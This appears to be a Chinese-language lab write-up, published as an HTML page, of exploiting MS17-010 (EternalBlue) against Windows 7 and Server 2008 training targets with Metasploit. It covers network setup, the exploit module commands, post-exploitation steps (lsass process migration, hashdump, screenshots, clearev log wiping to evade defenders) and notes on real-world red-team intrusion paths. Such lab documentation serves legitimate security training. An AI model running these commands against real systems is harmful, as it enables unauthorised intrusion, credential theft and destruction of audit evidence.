@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MS17-010 靶场实战记录（Win7 与 Server 2008）</title>
+<style>
+  :root {
+    --bg: #f6f8fa; --card: #ffffff; --ink: #24292f; --accent: #0969da; --accent-soft: #ddf4ff;
+    --success: #1a7f37; --success-soft: #dafbe1; --warn: #9a6700; --warn-soft: #fff8c5;
+    --red: #cf222e; --red-soft: #ffebe9; --mono: "Cascadia Code", Consolas, "Microsoft YaHei", monospace;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
+    background-color: var(--bg); color: var(--ink); line-height: 1.7;
+    margin: 0; padding: 40px 20px;
+  }
+  .container {
+    max-width: 900px; margin: 0 auto; background: var(--card);
+    border: 1px solid #d0d7de; border-radius: 12px; padding: 40px 48px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+  }
+  h1 { font-size: 24px; text-align: center; margin-bottom: 10px; color: #111; }
+  .subtitle { text-align: center; color: #57606a; font-size: 14px; margin-bottom: 30px; }
+  h2 { font-size: 18px; border-bottom: 2px solid #eaeef2; padding-bottom: 8px; margin-top: 36px; color: #111; }
+  h3 { font-size: 15px; margin-top: 24px; color: #333; }
+  .notice { background: #f6f8fa; border-left: 4px solid #8b949e; padding: 15px 20px; border-radius: 0 6px 6px 0; margin-bottom: 30px; font-size: 14px; color: #444; }
+  .command-box { background: #1f242f; color: #e6edf3; border-radius: 8px; padding: 16px 20px; font-family: var(--mono); font-size: 13px; overflow-x: auto; margin: 12px 0 4px; line-height: 1.6; }
+  .command-box span.c { color: #8b949e; }
+  .command-box span.g { color: #7ee787; }
+  .explain { background: #f9fafb; border: 1px solid #e1e4e8; border-radius: 6px; padding: 12px 16px; margin-bottom: 16px; font-size: 14px; color: #333; }
+  .explain strong { color: #0969da; }
+  code { font-family: var(--mono); background: #f3f4f6; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
+  .callout { border: 1px solid #d0d7de; border-radius: 8px; padding: 16px; margin: 16px 0; font-size: 14px; }
+  .callout.info { background: var(--accent-soft); border-color: #a5d6ff; }
+  .callout.warn { background: var(--warn-soft); border-color: #f5e6a8; }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; font-size: 14.5px; }
+  p { font-size: 14.5px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <h1>MS17-010 靶场实战记录</h1>
+  <div class="subtitle">Win7 与 Server 2008 靶机权限获取过程</div>
+
+  <div class="notice">
+    本文记录在本地靶场进行 MS17-010 永恒之蓝漏洞复现并获取靶机权限的过程。为保护隐私，本文中的真实 IP、用户名和 Hash 值均已隐藏。所有操作均在合法授权的本地靶场进行，严禁用于未经授权的非法渗透测试。
+  </div>
+
+  <h2>一、网络排障：从 100% 丢包到跨网段连通</h2>
+  <p>启动 Kali 和 Win7 靶机后，我做的第一件事是 ping 靶机，结果 100% 丢包。排查发现，因为我连的是手机热点，Kali 桥接后位于热点网段，而靶机位于灵境平台内部的靶机网段，两者不在同一个局域网，且没有路由。</p>
+
+  <h3>解决步骤：</h3>
+  <ol>
+    <li>在物理机 VMware 的“虚拟网络编辑器”中，选中 VMnet0，将“桥接到”从“自动”手动改成灵境创建的 <code>LingJing</code> 虚拟网卡。</li>
+    <li>重启 Kali，再次执行 <code>ip a</code>，发现 eth0 成功获取了灵境路由器网段的 IP。</li>
+    <li>添加静态路由，告诉 Kali 怎么去找靶机。</li>
+  </ol>
+  <div class="command-box">
+    <span class="c"># 添加路由，将去往靶机网段的流量交给灵境路由器</span><br>
+    sudo ip route add &lt;靶机网段&gt; via &lt;灵境路由器IP&gt; dev eth0<br>
+    <br>
+    <span class="c"># 再次 ping 靶机</span><br>
+    ping &lt;靶机IP&gt;
+  </div>
+  <div class="explain">
+    <strong>大意：</strong><br>
+    <code>sudo</code> 是使用管理员权限执行后面的命令。<code>ip route add</code> 是添加一条静态路由。<code>&lt;靶机网段&gt;</code> 是目标靶机所在的整个网段。<code>via &lt;灵境路由器IP&gt;</code> 是告诉 Kali，要去那个网段必须经过这个路由器。<code>dev eth0</code> 是指定从 eth0 这个网卡出去。<br>
+    <strong>回显结果：</strong> 成功的话会回显 <code>64 bytes from...</code>，0% packet loss，代表网络打通。
+  </div>
+
+  <h2>二、Win7 靶机权限获取过程</h2>
+  <p>网络通了之后，启动 MSF 进行攻击。</p>
+  <div class="command-box">
+    sudo msfconsole<br>
+    use exploit/windows/smb/ms17_010_eternalblue<br>
+    set RHOSTS &lt;Win7靶机IP&gt;<br>
+    set LHOST &lt;Kali IP&gt;<br>
+    run
+  </div>
+  <div class="explain">
+    <strong>大意：</strong><br>
+    <code>sudo msfconsole</code> 是以管理员权限启动 Metasploit 渗透框架。<br>
+    <code>use exploit/windows/smb/ms17_010_eternalblue</code> 是加载 MS17-010 永恒之蓝的漏洞利用模块。<br>
+    <code>set RHOSTS &lt;Win7靶机IP&gt;</code> 是设置目标靶机的 IP 地址。<br>
+    <code>set LHOST &lt;Kali IP&gt;</code> 是设置反弹回连的 IP，也就是我的 Kali 的 IP，靶机成功被攻陷后会主动连回这个 IP。<br>
+    <code>run</code> 是执行攻击。<br>
+    <strong>回显结果：</strong> 屏幕出现大量 [+] 号，最终回显 <code>Meterpreter session 1 opened</code>。
+  </div>
+
+  <p>输入 <code>getuid</code> 确认权限，回显 <code>NT AUTHORITY\SYSTEM</code>，拿到了靶机的最高权限。输入 <code>sysinfo</code> 确认系统为 Windows 7 SP1。</p>
+
+  <h3>后渗透操作与排错：</h3>
+  <p>先输入 <code>ps</code> 查看进程，准备进行进程迁移。</p>
+  <div class="callout info">
+    <strong>排错记录：找不到 lsass.exe 怎么办？</strong><br>
+    在 Win7 上，我按照常规操作在 <code>ps</code> 列表里找到了 PID 为 500 的 <code>lsass.exe</code>，执行 <code>migrate 500</code> 成功。<br>
+    但是后面打 Server 2008 时，我用同样的方法却找不到 PID 500。于是我进入 <code>shell</code>，在 Windows 的 cmd 里执行了 <code>tasklist | findstr lsass</code>，精准定位到 2008 上的 <code>lsass.exe</code> PID 是 472。执行 <code>exit</code> 退回 meterpreter，输入 <code>migrate 472</code> 成功。新手遇到找不到进程时，不要慌，进 shell 用 tasklist 查即可。
+  </div>
+  <div class="explain">
+    <strong>大意：</strong> <code>ps</code> 是列出目标机器当前运行的所有进程。 <code>migrate 500</code> 是将我们的控制木马从漏洞利用进程迁移到 PID 500 的 <code>lsass.exe</code> 核心进程里，防止漏洞利用进程崩溃导致掉线。 <code>hashdump</code> 是抓取系统所有用户的密码哈希值。 <code>arp -a</code> 是查看内网环境。
+  </div>
+
+  <h2>三、Server 2008 靶机权限获取过程</h2>
+  <p>在灵境平台启动 Server 2008 靶机，获取新 IP，并 ping 测通。然后复用之前的攻击流程：</p>
+  <div class="command-box">
+    use exploit/windows/smb/ms17_010_eternalblue<br>
+    set RHOSTS &lt;Server2008靶机IP&gt;<br>
+    set LHOST &lt;Kali IP&gt;<br>
+    run
+  </div>
+  <p>成功获取会话，<code>sysinfo</code> 确认系统为 <code>Windows Server 2008 R2</code>，<code>getuid</code> 仍为 <code>NT AUTHORITY\SYSTEM</code>。</p>
+  <p>随后同样执行了 <code>hashdump</code> 抓取哈希，并确认了管理员权限。在此机器上，通过 <code>tasklist</code> 排错，成功将其进程迁移到了 PID 472。</p>
+
+  <h2>四、清理与收尾</h2>
+  <p>两台机器的权限都拿到后，我执行了清理操作：</p>
+  <div class="command-box">
+    screenshot<br>
+    clearev<br>
+    exit
+  </div>
+  <div class="explain">
+    <strong>大意：</strong><br>
+    <code>screenshot</code> 是截取目标靶机当前的桌面，留作战果。<br>
+    <code>clearev</code> 是清理目标机器的系统日志、安全日志和应用日志，防止被防守方溯源。<br>
+    <code>exit</code> 是退出当前会话。
+  </div>
+  <p>回到物理机，以管理员权限打开 PowerShell，执行清理命令：</p>
+  <div class="command-box">
+    netsh interface portproxy reset
+  </div>
+  <div class="explain">
+    <strong>大意：</strong> 清理掉我们之前在物理机上设置的临时转发规则，保持本地环境干净。
+  </div>
+
+  <h2>五、经 AI 咨询的后续复盘</h2>
+  <p>事后我向 AI 咨询，对这个漏洞和实战有了更清晰的理解：</p>
+  <ul>
+    <li><strong>横向移动的本质</strong>：在靶场里，打 Win7 和打 Server 2008 的操作几乎一模一样，都是同一个漏洞和相同的后渗透命令。区别在于实战中的定位不同，Win7 通常是边缘跳板机，Server 2008 是核心业务服务器。</li>
+    <li><strong>真实 HVV 的路径</strong>：真实的 HVV 中，公网通常会封禁 445 端口，我们无法直接用 MS17-010 打进去。第一步通常是用 Web 漏洞如弱口令、越权、文件上传，拿到一台外网 Web 服务器的 Webshell，然后用隧道代理进入内网，最后才用今天记录的这套方法进行内网横向。</li>
+  </ul>
+
+  <div class="callout warn" style="margin-top: 30px; font-size: 13px;">
+    <strong>合规声明</strong><br>
+    本文所有操作均在授权靶场中进行。在真实网络环境中，必须严格遵守法律法规，未经授权严禁对任何系统进行扫描、渗透或破坏。
+  </div>
+
+</div>
+</body>
+</html>
